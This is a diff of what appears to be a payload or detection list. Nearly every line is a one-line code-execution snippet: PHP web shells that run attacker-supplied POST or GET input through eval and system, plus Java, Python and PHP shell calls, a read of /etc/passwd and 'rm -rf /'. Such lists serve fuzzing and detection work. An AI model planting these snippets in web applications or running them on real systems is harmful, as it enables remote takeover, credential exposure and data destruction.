@@ -1,8 +1,37 @@
-<?php system($_GET['c']); ?>
-<?= exec('id') ?>
+${@eval($_POST[cmd])}
 <%@ page import="java.io.*" %>
-eval(base64_decode($_POST[c]))
+<?= exec('id') ?>
+<?= passthru('id') ?>
+<?= shell_exec('id') ?>
+<?= system('id') ?>
+<?php @eval($_POST['cmd']); ?>
+<?php eval($_POST['cmd']); ?>
+<?php exec('id'); ?>
+<?php expect_popen('id'); ?>
+<?php passthru('id'); ?>
+<?php popen('id','r'); ?>
+<?php proc_open('id',$desc,$pipes); ?>
+<?php shell_exec('id'); ?>
+<?php system($_GET['c']); ?>
+<?php system('id'); ?>
+ProcessBuilder('id').start()
+Runtime.getRuntime().exec('cat /etc/passwd')
+Runtime.getRuntime().exec('id')
+__import__('os').popen('id').read()
+__import__('os').system('id')
+eval("__import__('os').system('id')")
 eval("return 1")
+eval(base64_decode($_POST['cmd']))
+eval(base64_decode($_POST[c]))
+exec("import os; os.system('id')")
+expect_popen('id')
+new ProcessBuilder('id').start()
+os.popen('id').read()
+os.system('id')
+popen('id', 'r')
+proc_open('id', $desc, $pipes)
+shell_exec('id')
+subprocess.Popen('id')
+subprocess.call(['id'])
 system("cat /etc/passwd")
 system('rm -rf /')
-shell_exec('id')
